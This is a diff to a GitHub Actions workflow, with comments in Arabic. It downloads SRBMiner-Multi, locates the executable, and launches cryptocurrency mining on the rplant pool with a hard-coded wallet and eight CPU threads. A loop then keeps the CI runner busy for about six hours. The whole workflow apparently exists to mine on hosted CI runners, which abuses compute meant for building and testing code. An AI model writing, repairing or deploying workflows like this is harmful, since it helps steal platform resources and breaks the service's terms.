@@ -9,17 +9,37 @@ jobs:
     timeout-minutes: 360
 
     steps:
-      - name: Download SRBMiner
+      - name: Download SRBMiner 3.0.3
         shell: pwsh
         run: |
           Invoke-WebRequest -Uri "https://github.com/doktor83/SRBMiner-Multi/releases/download/3.0.3/SRBMiner-Multi-3-0-3-win64.zip" -OutFile "miner.zip"
           Expand-Archive miner.zip -DestinationPath "miner"
 
-      - name: Start Mining YESPOWER Rplant
+      - name: Start SRBMiner
         shell: pwsh
         run: |
           cd miner
-          Start-Process ".\SRBMiner-MULTI.exe" -ArgumentList @(
+
+          # الحصول على المجلد الحقيقي بعد فك الضغط
+          $folder = Get-ChildItem -Directory | Where-Object { $_.Name -like "SRBMiner*" } | Select-Object -First 1
+          if (-not $folder) {
+            Write-Error "❌ لم يتم العثور على مجلد SRBMiner بعد فك الضغط"
+            exit 1
+          }
+
+          # تحديد مسار ملف التنفيذ
+          $exe = Join-Path $folder.FullName "SRBMiner-MULTI.exe"
+
+          if (-not (Test-Path $exe)) {
+            Write-Error "❌ لم يتم العثور على SRBMiner-MULTI.exe داخل: $($folder.FullName)"
+            exit 1
+          }
+
+          Write-Host "➡ تشغيل SRBMiner من المسار:"
+          Write-Host $exe
+
+          # تشغيل المعدّن
+          Start-Process $exe -ArgumentList @(
             "--algorithm", "yespower"
             "--pool", "eu.rplant.xyz:17149"
             "--wallet", "Ab75TWDBpPx8ArWeTFLrQcgVA8xRxCwW7E"
@@ -27,10 +47,10 @@ jobs:
             "--cpu-threads", "8"
           )
 
-      - name: Keep Alive
+      - name: Keep Session Alive
         shell: pwsh
         run: |
           for ($i=1; $i -le 350; $i++) {
-            Write-Host "Mining Active ($i/350)"
+            Write-Host "⛏️ Mining Active ($i/350)"
             Start-Sleep -Seconds 60
           }
